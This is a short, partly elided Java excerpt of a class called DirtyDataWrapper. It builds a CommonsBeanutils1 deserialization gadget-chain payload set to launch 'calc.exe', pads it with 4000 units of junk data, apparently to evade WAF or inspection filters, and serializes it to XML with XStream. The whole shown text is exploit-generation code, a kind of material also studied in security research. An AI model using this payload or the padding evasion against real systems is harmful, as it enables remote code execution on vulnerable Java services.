...
public class DirtyDataWrapper {
    ...
    public static void main(String[] args) throws Exception {
        ...
        Object obj = commonsBeanutils1.getObject("calc.exe");
        DirtyDataWrapper wrapper = new DirtyDataWrapper(obj,4000);
        Object wrapObj = wrapper.doWrap();
        XStream xStream = new XStream();
        String xml = xStream.toXML(wrapObj);
